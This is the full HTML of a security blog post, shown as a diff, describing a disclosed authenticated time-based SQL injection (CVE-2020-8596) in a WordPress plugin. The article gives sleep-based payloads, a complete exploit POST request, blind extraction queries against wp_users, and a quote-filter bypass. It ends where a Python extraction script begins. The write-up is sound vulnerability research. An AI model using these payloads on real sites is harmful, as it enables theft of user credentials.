@@ -1,0 +1,818 @@
+
+<!DOCTYPE html>
+<html lang="en-US">
+	<head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="profile" href="http://gmpg.org/xfn/11">
+		
+	<!-- This site is optimized with the Yoast SEO plugin v14.3 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Authenticated Time Based SQL Injection in WordPress Participants Database Plugin</title>
+	<meta name="description" content="Writeup with PoC for an authenticated time based SQL injection exploit that was identified in the Participants Database WordPress Plugin version &lt;= 1.9.5.5. (CVE-2020-8596)" />
+	<meta name="robots" content="index, follow" />
+	<meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+	<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+	<link rel="canonical" href="https://blog.impenetrable.tech/cve-2020-8596" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Authenticated Time Based SQL Injection in WordPress Participants Database Plugin" />
+	<meta property="og:description" content="Writeup with PoC for an authenticated time based SQL injection exploit that was identified in the Participants Database WordPress Plugin version &lt;= 1.9.5.5. (CVE-2020-8596)" />
+	<meta property="og:url" content="https://blog.impenetrable.tech/cve-2020-8596" />
+	<meta property="og:site_name" content="Impenetrable Blog" />
+	<meta property="article:published_time" content="2020-02-10T12:51:48+00:00" />
+	<meta property="article:modified_time" content="2020-02-10T13:46:11+00:00" />
+	<meta property="og:image" content="https://blog.impenetrable.tech/wp-content/uploads/2020/02/participants-1.png" />
+	<meta property="og:image:width" content="1280" />
+	<meta property="og:image:height" content="688" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:creator" content="@ImpenetrableSec" />
+	<meta name="twitter:site" content="@ImpenetrableSec" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://blog.impenetrable.tech/#organization","name":"Impenetrable","url":"https://blog.impenetrable.tech/","sameAs":["https://twitter.com/ImpenetrableSec"],"logo":{"@type":"ImageObject","@id":"https://blog.impenetrable.tech/#logo","inLanguage":"en-US","url":"","caption":"Impenetrable"},"image":{"@id":"https://blog.impenetrable.tech/#logo"}},{"@type":"WebSite","@id":"https://blog.impenetrable.tech/#website","url":"https://blog.impenetrable.tech/","name":"Impenetrable Blog","description":"Nothing is....Impenetrable.","publisher":{"@id":"https://blog.impenetrable.tech/#organization"},"potentialAction":[{"@type":"SearchAction","target":"https://blog.impenetrable.tech/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://blog.impenetrable.tech/cve-2020-8596#primaryimage","inLanguage":"en-US","url":"https://blog.impenetrable.tech/wp-content/uploads/2020/02/participants-1.png","width":1280,"height":688},{"@type":"WebPage","@id":"https://blog.impenetrable.tech/cve-2020-8596#webpage","url":"https://blog.impenetrable.tech/cve-2020-8596","name":"Authenticated Time Based SQL Injection in WordPress Participants Database Plugin","isPartOf":{"@id":"https://blog.impenetrable.tech/#website"},"primaryImageOfPage":{"@id":"https://blog.impenetrable.tech/cve-2020-8596#primaryimage"},"datePublished":"2020-02-10T12:51:48+00:00","dateModified":"2020-02-10T13:46:11+00:00","description":"Writeup with PoC for an authenticated time based SQL injection exploit that was identified in the Participants Database WordPress Plugin version &lt;= 1.9.5.5. (CVE-2020-8596)","inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://blog.impenetrable.tech/cve-2020-8596"]}]},{"@type":"Article","@id":"https://blog.impenetrable.tech/cve-2020-8596#article","isPartOf":{"@id":"https://blog.impenetrable.tech/cve-2020-8596#webpage"},"author":{"@id":"https://blog.impenetrable.tech/#/schema/person/82e798df1b908f7157f63e6c62c289c2"},"headline":"Authenticated Time Based SQL Injection in WordPress Participants Database Plugin","datePublished":"2020-02-10T12:51:48+00:00","dateModified":"2020-02-10T13:46:11+00:00","commentCount":"1","mainEntityOfPage":{"@id":"https://blog.impenetrable.tech/cve-2020-8596#webpage"},"publisher":{"@id":"https://blog.impenetrable.tech/#organization"},"image":{"@id":"https://blog.impenetrable.tech/cve-2020-8596#primaryimage"},"keywords":"cve-2020-8596,sql injection,time based,wordpress","articleSection":"Discovered Exploits","inLanguage":"en-US"},{"@type":["Person"],"@id":"https://blog.impenetrable.tech/#/schema/person/82e798df1b908f7157f63e6c62c289c2","name":"Teacish","image":{"@type":"ImageObject","@id":"https://blog.impenetrable.tech/#personlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/4b662e0825eb0122d7baa03fa1a8a93c?s=96&d=mm&r=g","caption":"Teacish"}}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Impenetrable Blog &raquo; Feed" href="https://blog.impenetrable.tech/feed" />
+<link rel="alternate" type="application/rss+xml" title="Impenetrable Blog &raquo; Comments Feed" href="https://blog.impenetrable.tech/comments/feed" />
+<link rel="alternate" type="application/rss+xml" title="Impenetrable Blog &raquo; Authenticated Time Based SQL Injection in WordPress Participants Database Plugin  Comments Feed" href="https://blog.impenetrable.tech/cve-2020-8596/feed" />
+		<!-- This site uses the Google Analytics by MonsterInsights plugin v8.1.0 - Using Analytics tracking - https://www.monsterinsights.com/ -->
+							<script src="//www.googletagmanager.com/gtag/js?id=UA-156471086-1"  type="text/javascript" data-cfasync="false" async></script>
+			<script type="text/javascript" data-cfasync="false">
+				var mi_version = '8.1.0';
+				var mi_track_user = true;
+				var mi_no_track_reason = '';
+				
+								var disableStrs = [
+															'ga-disable-UA-156471086-1',
+									];
+
+				/* Function to detect opted out users */
+				function __gtagTrackerIsOptedOut() {
+					for ( var index = 0; index < disableStrs.length; index++ ) {
+						if ( document.cookie.indexOf( disableStrs[ index ] + '=true' ) > -1 ) {
+							return true;
+						}
+					}
+
+					return false;
+				}
+
+				/* Disable tracking if the opt-out cookie exists. */
+				if ( __gtagTrackerIsOptedOut() ) {
+					for ( var index = 0; index < disableStrs.length; index++ ) {
+						window[ disableStrs[ index ] ] = true;
+					}
+				}
+
+				/* Opt-out function */
+				function __gtagTrackerOptout() {
+					for ( var index = 0; index < disableStrs.length; index++ ) {
+						document.cookie = disableStrs[ index ] + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
+						window[ disableStrs[ index ] ] = true;
+					}
+				}
+
+				if ( 'undefined' === typeof gaOptout ) {
+					function gaOptout() {
+						__gtagTrackerOptout();
+					}
+				}
+								window.dataLayer = window.dataLayer || [];
+
+				window.MonsterInsightsDualTracker = {
+					helpers: {},
+					trackers: {},
+				};
+				if ( mi_track_user ) {
+					function __gtagDataLayer() {
+						dataLayer.push( arguments );
+					}
+
+					function __gtagTracker( type, name, parameters ) {
+						if ( type === 'event' ) {
+							
+															parameters.send_to = monsterinsights_frontend.ua;
+								__gtagDataLayer.apply( null, arguments );
+													} else {
+							__gtagDataLayer.apply( null, arguments );
+						}
+					}
+					__gtagTracker( 'js', new Date() );
+					__gtagTracker( 'set', {
+						'developer_id.dZGIzZG' : true,
+											} );
+															__gtagTracker( 'config', 'UA-156471086-1', {"forceSSL":"true","link_attribution":"true"} );
+										window.gtag = __gtagTracker;										(
+						function () {
+							/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
+							/* ga and __gaTracker compatibility shim. */
+							var noopfn = function () {
+								return null;
+							};
+							var newtracker = function () {
+								return new Tracker();
+							};
+							var Tracker = function () {
+								return null;
+							};
+							var p = Tracker.prototype;
+							p.get = noopfn;
+							p.set = noopfn;
+							p.send = function (){
+								var args = Array.prototype.slice.call(arguments);
+								args.unshift( 'send' );
+								__gaTracker.apply(null, args);
+							};
+							var __gaTracker = function () {
+								var len = arguments.length;
+								if ( len === 0 ) {
+									return;
+								}
+								var f = arguments[len - 1];
+								if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
+									if ( 'send' === arguments[0] ) {
+										var hitConverted, hitObject = false, action;
+										if ( 'event' === arguments[1] ) {
+											if ( 'undefined' !== typeof arguments[3] ) {
+												hitObject = {
+													'eventAction': arguments[3],
+													'eventCategory': arguments[2],
+													'eventLabel': arguments[4],
+													'value': arguments[5] ? arguments[5] : 1,
+												}
+											}
+										}
+										if ( 'pageview' === arguments[1] ) {
+											if ( 'undefined' !== typeof arguments[2] ) {
+												hitObject = {
+													'eventAction': 'page_view',
+													'page_path' : arguments[2],
+												}
+											}
+										}
+										if ( typeof arguments[2] === 'object' ) {
+											hitObject = arguments[2];
+										}
+										if ( typeof arguments[5] === 'object' ) {
+											Object.assign( hitObject, arguments[5] );
+										}
+										if ( 'undefined' !== typeof arguments[1].hitType ) {
+											hitObject = arguments[1];
+											if ( 'pageview' === hitObject.hitType ) {
+												hitObject.eventAction = 'page_view';
+											}
+										}
+										if ( hitObject ) {
+											action = 'timing' === arguments[1].hitType ? 'timing_complete' : hitObject.eventAction;
+											hitConverted = mapArgs( hitObject );
+											__gtagTracker( 'event', action, hitConverted );
+										}
+									}
+									return;
+								}
+
+								function mapArgs( args ) {
+									var arg, hit = {};
+									var gaMap = {
+										'eventCategory': 'event_category',
+										'eventAction': 'event_action',
+										'eventLabel': 'event_label',
+										'eventValue': 'event_value',
+										'nonInteraction': 'non_interaction',
+										'timingCategory': 'event_category',
+										'timingVar': 'name',
+										'timingValue': 'value',
+										'timingLabel': 'event_label',
+										'page' : 'page_path',
+										'location' : 'page_location',
+										'title' : 'page_title',
+									};
+									for ( arg in args ) {
+																				if ( ! ( ! args.hasOwnProperty(arg) || ! gaMap.hasOwnProperty(arg) ) ) {
+											hit[gaMap[arg]] = args[arg];
+										} else {
+											hit[arg] = args[arg];
+										}
+									}
+									return hit;
+								}
+
+								try {
+									f.hitCallback();
+								} catch ( ex ) {
+								}
+							};
+							__gaTracker.create = newtracker;
+							__gaTracker.getByName = newtracker;
+							__gaTracker.getAll = function () {
+								return [];
+							};
+							__gaTracker.remove = noopfn;
+							__gaTracker.loaded = true;
+							window['__gaTracker'] = __gaTracker;
+						}
+					)();
+									} else {
+										console.log( "" );
+					( function () {
+							function __gtagTracker() {
+								return null;
+							}
+							window['__gtagTracker'] = __gtagTracker;
+							window['gtag'] = __gtagTracker;
+					} )();
+									}
+			</script>
+				<!-- / Google Analytics by MonsterInsights -->
+				<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/12.0.0-1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/blog.impenetrable.tech\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.7"}};
+			/*! This file is auto-generated */
+			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,55356,57342,8205,55358,56605,8205,55357,56424,55356,57340],[55357,56424,55356,57342,8203,55358,56605,8203,55357,56424,55356,57340])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='https://blog.impenetrable.tech/wp-includes/css/dist/block-library/style.min.css?ver=5.4.7' type='text/css' media='all' />
+<link rel='stylesheet' id='mkaz-code-syntax-css-css'  href='https://blog.impenetrable.tech/wp-content/plugins/code-syntax-block/assets/blocks.style.css?ver=1591901883' type='text/css' media='all' />
+<link rel='stylesheet' id='mkaz-code-syntax-prism-css-css'  href='https://blog.impenetrable.tech/wp-content/plugins/code-syntax-block/assets/prism/prism.css?ver=1591901883' type='text/css' media='all' />
+<link rel='stylesheet' id='Impen-webfonts-css'  href='//fonts.googleapis.com/css?family=Open+Sans%3A400%2C500%2C700%7CRaleway%3A300%2C400%2C400italic%2C500%2C600%2C700%2C800%2C900%2C700italic&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
+<link rel='stylesheet' id='bootstrap-css'  href='https://blog.impenetrable.tech/wp-content/themes/ImpenTheme/css/bootstrap.min.css?ver=5.4.7' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-css'  href='https://blog.impenetrable.tech/wp-content/themes/ImpenTheme/css/font-awesome.min.css?ver=5.4.7' type='text/css' media='all' />
+<link rel='stylesheet' id='Impen-style-css'  href='https://blog.impenetrable.tech/wp-content/themes/ImpenTheme/style.css?ver=5.4.7' type='text/css' media='all' />
+<link rel='stylesheet' id='simple-social-icons-font-css'  href='https://blog.impenetrable.tech/wp-content/plugins/simple-social-icons/css/style.css?ver=3.0.2' type='text/css' media='all' />
+<link rel='stylesheet' id='jquery-lazyloadxt-spinner-css-css'  href='//blog.impenetrable.tech/wp-content/plugins/a3-lazy-load/assets/css/jquery.lazyloadxt.spinner.css?ver=5.4.7' type='text/css' media='all' />
+<script type='text/javascript'>
+/* <![CDATA[ */
+var monsterinsights_frontend = {"js_events_tracking":"true","download_extensions":"doc,pdf,ppt,zip,xls,docx,pptx,xlsx","inbound_paths":"[]","home_url":"https:\/\/blog.impenetrable.tech","hash_tracking":"false","ua":"UA-156471086-1","v4_id":""};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://blog.impenetrable.tech/wp-content/plugins/google-analytics-for-wordpress/assets/js/frontend-gtag.min.js?ver=8.1.0'></script>
+<script type='text/javascript' src='https://blog.impenetrable.tech/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
+<script type='text/javascript' src='https://blog.impenetrable.tech/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<script type='text/javascript' src='https://blog.impenetrable.tech/wp-content/themes/ImpenTheme/js/bootstrap.min.js?ver=5.4.7'></script>
+<script type='text/javascript' src='https://blog.impenetrable.tech/wp-content/themes/ImpenTheme/js/slick.min.js?ver=5.4.7'></script>
+<script type='text/javascript' src='https://blog.impenetrable.tech/wp-content/themes/ImpenTheme/js/Impen.js?ver=5.4.7'></script>
+<script type='text/javascript' src='https://blog.impenetrable.tech/wp-content/plugins/simple-social-icons/svgxuse.js?ver=1.1.21'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.impenetrable.tech/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blog.impenetrable.tech/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 5.4.7" />
+<link rel='shortlink' href='https://blog.impenetrable.tech/?p=236' />
+<link rel="alternate" type="application/json+oembed" href="https://blog.impenetrable.tech/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.impenetrable.tech%2Fcve-2020-8596" />
+<link rel="alternate" type="text/xml+oembed" href="https://blog.impenetrable.tech/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.impenetrable.tech%2Fcve-2020-8596&#038;format=xml" />
+<style type="text/css" id="Impen-custom-theme-css"></style><style type="text/css">.broken_link, a.broken_link {
+	text-decoration: line-through;
+}</style><link rel="icon" href="https://blog.impenetrable.tech/wp-content/uploads/2019/11/impen2.bmp" sizes="32x32" />
+<link rel="icon" href="https://blog.impenetrable.tech/wp-content/uploads/2019/11/impen2.bmp" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://blog.impenetrable.tech/wp-content/uploads/2019/11/impen2.bmp" />
+<meta name="msapplication-TileImage" content="https://blog.impenetrable.tech/wp-content/uploads/2019/11/impen2.bmp" />
+	</head>
+	<body class="post-template-default single single-post postid-236 single-format-standard wp-custom-logo">
+
+		<!-- Navigation -->
+		<nav class="navbar" role="navigation">
+			<div class="container">
+				<!-- Brand and toggle get grouped for better mobile display --> 
+				<div class="navbar-header"> 
+<!-- 					<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex2-collapse"> 
+<!-- 						<span class="sr-only">Toggle navigation</span> 
+						<span class="icon-bar"></span> 
+						<span class="icon-bar"></span> 
+						<span class="icon-bar"></span>  --> 
+					</button> 
+					<a href="https://blog.impenetrable.tech/" class="custom-logo-link" rel="home"><img width="230" height="55" src="https://blog.impenetrable.tech/wp-content/uploads/2020/01/cropped-bigLogo3-1.png" class="custom-logo" alt="Impenetrable Blog" /></a>				</div>
+					<!--  -->
+			</div>
+		</nav>
+		<!-- End: Navigation -->
+
+		
+				
+			<!-- BEGIN .container -->
+			<div class="container mz-sidebar-right">
+
+			<div id="content">
+				<div class="row">
+					<div class="col-md-8">
+
+	<div id="primary" class="content-area">
+		<main id="main" class="site-main" role="main">
+
+		
+									<article  id="post-236" class="post-236 post type-post status-publish format-standard has-post-thumbnail hentry category-discovered-exploits tag-cve-2020-8596 tag-sql-injection tag-time-based tag-wordpress">
+
+							<div class="post-image">
+																	<a href="https://blog.impenetrable.tech/cve-2020-8596" title="Authenticated Time Based SQL Injection in WordPress Participants Database Plugin ">
+									<img width="1280" height="688" src="//blog.impenetrable.tech/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://blog.impenetrable.tech/wp-content/uploads/2020/02/participants-1.png" class="lazy lazy-hidden attachment-Impen-middle-thumbnail size-Impen-middle-thumbnail wp-post-image" alt="" srcset="" data-srcset="https://blog.impenetrable.tech/wp-content/uploads/2020/02/participants-1.png 1280w, https://blog.impenetrable.tech/wp-content/uploads/2020/02/participants-1-300x161.png 300w, https://blog.impenetrable.tech/wp-content/uploads/2020/02/participants-1-1024x550.png 1024w, https://blog.impenetrable.tech/wp-content/uploads/2020/02/participants-1-768x413.png 768w" sizes="(max-width: 1280px) 100vw, 1280px" /><noscript><img width="1280" height="688" src="https://blog.impenetrable.tech/wp-content/uploads/2020/02/participants-1.png" class="attachment-Impen-middle-thumbnail size-Impen-middle-thumbnail wp-post-image" alt="" srcset="https://blog.impenetrable.tech/wp-content/uploads/2020/02/participants-1.png 1280w, https://blog.impenetrable.tech/wp-content/uploads/2020/02/participants-1-300x161.png 300w, https://blog.impenetrable.tech/wp-content/uploads/2020/02/participants-1-1024x550.png 1024w, https://blog.impenetrable.tech/wp-content/uploads/2020/02/participants-1-768x413.png 768w" sizes="(max-width: 1280px) 100vw, 1280px" /></noscript>									</a>
+															</div>
+
+							<div class="post-header">
+								<div class="cat"><a href="https://blog.impenetrable.tech/category/discovered-exploits" rel="category tag">Discovered Exploits</a></div>
+								<h1>Authenticated Time Based SQL Injection in WordPress Participants Database Plugin <= 1.9.5.5 (CVE-2020-8596)</h1>
+
+								<div class="post-meta">
+																			<span><i class="fa fa-calendar"></i>February 10, 2020</span>
+										<span><i class="fa fa-user"></i><a href="https://blog.impenetrable.tech/author/teacish" title="Posts by Teacish" rel="author">Teacish</a></span>
+																					<span><i class="fa fa-commenting-o"></i><a href="https://blog.impenetrable.tech/cve-2020-8596#comments">1 Comment</a></span>
+																												</div>
+
+							</div>
+
+							<div class="post-entry">
+								
+<div id="preface"> <span> <b>Preface: </b> As part of our standard business practice, we endeavor to provide our penetration testers research time to develop tools, discover exploits and contribute to the community with the aim to stay ahead of the game.
+
+We always follow responsible disclosure guidelines! </span> </div>
+
+
+
+<h4>Background</h4>
+
+
+
+<p>Welcome back, another week, another WordPress issue. Working off my previous bug hunting in WordPress plugins, I added a bunch more plugins to my local test WordPress instance and went hunting, this time with an interesting SQL injection vulnerability, and one that is a mouthful to say.</p>
+
+
+
+<h4>The Plugin</h4>
+
+
+
+<p>The WordPress plugin chosen for testing this time was the Participants Database. Its a nifty little plugin that allows you to create a database for any requirement, manageable from the admin dashboard.</p>
+
+
+
+<figure class="wp-block-embed-wordpress wp-block-embed is-type-wp-embed is-provider-plugin-directory"><div class="wp-block-embed__wrapper">
+<blockquote class="wp-embedded-content" data-secret="eGebWwWzYU"><a href="https://en-gb.wordpress.org/plugins/participants-database/">Participants Database</a></blockquote><iframe title="&#8220;Participants Database&#8221; &#8212; Plugin Directory" class="lazy lazy-hidden wp-embedded-content" sandbox="allow-scripts" security="restricted" style="position: absolute; clip: rect(1px, 1px, 1px, 1px);"  data-lazy-type="iframe" data-src="https://en-gb.wordpress.org/plugins/participants-database/embed/#?secret=eGebWwWzYU" data-secret="eGebWwWzYU" width="600" height="338" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe><noscript><iframe title="&#8220;Participants Database&#8221; &#8212; Plugin Directory" class="wp-embedded-content" sandbox="allow-scripts" security="restricted" style="position: absolute; clip: rect(1px, 1px, 1px, 1px);" src="https://en-gb.wordpress.org/plugins/participants-database/embed/#?secret=eGebWwWzYU" data-secret="eGebWwWzYU" width="600" height="338" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe></noscript>
+</div></figure>
+
+
+
+<h4>The Identification</h4>
+
+
+
+<p>The first note to make is that this is an authenticated SQL injection, thus the risk is reduced. However, there are still many scenarios where this could be exploited to an attackers advantage.</p>
+
+
+
+<p>Using the same methodology as last time, I throw payloads at each dynamic function on each page until something triggers, or returns data that might be of interest. In this instance, it was the SQL &#8220;sleep&#8221; command that did it.</p>
+
+
+
+<p>The page &#8220;/wp-admin/admin.php?page=participants-database&#8221; seemingly accepted the injected SQL sleep command when appended to entries in the body of the POST request sent to update/reorder the page. These three POST parameters were:</p>
+
+
+
+<ul><li><span style="color:#fbfbfb" class="tadv-color">ascdesc</span></li><li><span style="color:#fbfbfb" class="tadv-color">list_filter_count</span></li><li><span style="color:#fbfbfb" class="tadv-color">sortBy</span></li></ul>
+
+
+
+<p></p>
+
+
+
+<p>Lets use the &#8220;ascdesc&#8221; parameter as the example. </p>
+
+
+
+<p>I sent the payload:</p>
+
+
+
+<pre class="wp-block-code"><code lang="sql" class="language-sql"> (select*from(select(sleep(20)))a)</code></pre>
+
+
+
+<p></p>
+
+
+
+<p>The page did not return for 40 seconds. This was interesting for two reasons. Firstly, this is the common payload for the &#8220;Sleepy User Agent&#8221; SQL injection attack often targeting the User Agent parameter in a request&#8217;s header values. Secondly, why was it sleeping for 40 seconds when the payload is using 20?</p>
+
+
+
+<p>I nearly ignored it putting it down to sending too many requests to my poor little virtual machine, but as  it was a time based payload and it was taking time to return, it would make sense not to ignore it.</p>
+
+
+
+<p>The following is an example POST request with the SQL payload in the body.</p>
+
+
+
+<pre class="wp-block-code"><code lang="markup" class="language-markup">POST /wp-admin/admin.php?page=participants-database HTTP/1.1
+Host: *redacted....cause*
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: /wp-admin/admin.php?page=participants-database
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 169
+Connection: close
+Cookie: *cookies were here*
+
+Upgrade-Insecure-Requests: 1
+
+action=admin_list_filter&amp;search_field%5B0%5D=&amp;operator%5B0%5D=LIKE&amp;value%5B0%5D=&amp;logic%5B0%5D=AND&amp;list_filter_count=1&amp;sortBy=date_updated&amp;ascdesc=desc%2c(select*from(select(sleep(20)))a)&amp;submit-button=Sort</code></pre>
+
+
+
+<p></p>
+
+
+
+<h4>The Exploit</h4>
+
+
+
+<p>Ok, so first thing first, why was it sleeping and why for 40 seconds? Being that this is the exact double of 20 (I am such a maths genius) I figured maybe the statement is executed twice. So the first test was injecting different sleep lengths to see if they all match up at double.</p>
+
+
+
+<p>20 seconds:</p>
+
+
+
+<pre class="wp-block-code"><code lang="sql" class="language-sql">(select*from(select(sleep(20)))a)</code></pre>
+
+
+
+<figure class="wp-block-image size-large"><img src="//blog.impenetrable.tech/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://blog.impenetrable.tech/wp-content/uploads/2020/02/20-1.png" alt="" class="lazy lazy-hidden wp-image-300"/><noscript><img src="https://blog.impenetrable.tech/wp-content/uploads/2020/02/20-1.png" alt="" class="wp-image-300"/></noscript></figure>
+
+
+
+<p>10 seconds:</p>
+
+
+
+<pre class="wp-block-code"><code lang="sql" class="language-sql"> (select*from(select(sleep(10)))a)</code></pre>
+
+
+
+<figure class="wp-block-image size-large"><img src="//blog.impenetrable.tech/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://blog.impenetrable.tech/wp-content/uploads/2020/02/10-1.png" alt="" class="lazy lazy-hidden wp-image-301"/><noscript><img src="https://blog.impenetrable.tech/wp-content/uploads/2020/02/10-1.png" alt="" class="wp-image-301"/></noscript></figure>
+
+
+
+<p>5 seconds:</p>
+
+
+
+<pre class="wp-block-code"><code lang="sql" class="language-sql"> (select*from(select(sleep(5)))a) </code></pre>
+
+
+
+<figure class="wp-block-image size-large"><img src="//blog.impenetrable.tech/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://blog.impenetrable.tech/wp-content/uploads/2020/02/5-1.png" alt="" class="lazy lazy-hidden wp-image-302"/><noscript><img src="https://blog.impenetrable.tech/wp-content/uploads/2020/02/5-1.png" alt="" class="wp-image-302"/></noscript></figure>
+
+
+
+<p>Excellent, each time we change the sleep time in the SQL command the request returns at almost exactly double the time. Which means that the exploit is working, and we know its executing twice. Now its time to try and extract some data.</p>
+
+
+
+<h4>Extraction of data</h4>
+
+
+
+<p>So as this is a blind exploitation (no responses returned with data), we will have to create payloads that will sleep if the SQL statement we inject evaluates to &#8220;true&#8221;.</p>
+
+
+
+<p>Using knowledge of my environment, I know that the first entry in my test WordPress user database is &#8220;admin&#8221;, so I used this as the bases for my first payload.</p>
+
+
+
+<pre class="wp-block-code"><code lang="sql" class="language-sql">(select sleep(5) from wp_users where substring(length(user_login),1,1)='a' and id=1)</code></pre>
+
+
+
+<p></p>
+
+
+
+<p>This statement will sleep for 5 seconds (10 seconds in this instance as its executed twice) if the first character of the first username in the &#8220;wp_users&#8221; table is &#8220;a&#8221;. In our case, this should verify to true and sleep&#8230;.it did not.</p>
+
+
+
+<h4>Filter Bypass</h4>
+
+
+
+<p>So, the fact my SQL statement was not triggering the sleep means there must be some sort of filter/escaping happening before its passed to the back end. </p>
+
+
+
+<p>My assumption at this point is that single quotes are filtered as we already know brackets are accepted or the original payload would not have triggered.</p>
+
+
+
+<p>We can bypass the use of single quotes in this statement by using ascii char codes like so:</p>
+
+
+
+<pre class="wp-block-code"><code lang="sql" class="language-sql">(select sleep(5) from wp_users where ascii(substring(length(user_login),1,1))=53 and id=1)</code></pre>
+
+
+
+<p>Bingo! This triggered and successfully slept for 10 seconds.</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter"><img class="lazy lazy-hidden" src="//blog.impenetrable.tech/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://3.bp.blogspot.com/-r1a-7OVQHV4/TWb41Xv5P0I/AAAAAAAAEbM/1jkbplItMWo/s1600/cakeify-hurray.gif" alt="Image result for hurray"/><noscript><img src="https://3.bp.blogspot.com/-r1a-7OVQHV4/TWb41Xv5P0I/AAAAAAAAEbM/1jkbplItMWo/s1600/cakeify-hurray.gif" alt="Image result for hurray"/></noscript></figure></div>
+
+
+
+<h4>Automating Data Exfiltration</h4>
+
+
+
+<p>So now we have a working payload we need to automate this extraction. One could simple go through iterating over each ascii character with BurpSuite&#8217;s Intruder, however I thought I would write a proper proof of concept script that would allow the devs to test it simply.</p>
+
+
+
+<p>The following code will take the URL as the command line argument, then it will ask for an account to login with. Once it authenticates to WordPress it will then extract the username and password (hash) of the first user in the &#8220;wp_users&#8221; database by iterating over each ascii character one by one, if the response takes more than a defined time (based on the sleep command) it will print that character.</p>
+
+
+
+<pre class="wp-block-code"><code lang="python" class="language-python">import requests
+import sys
+import getpass
+
+def wpLogin(ip, username, password):
+
+        #Sets URL for login
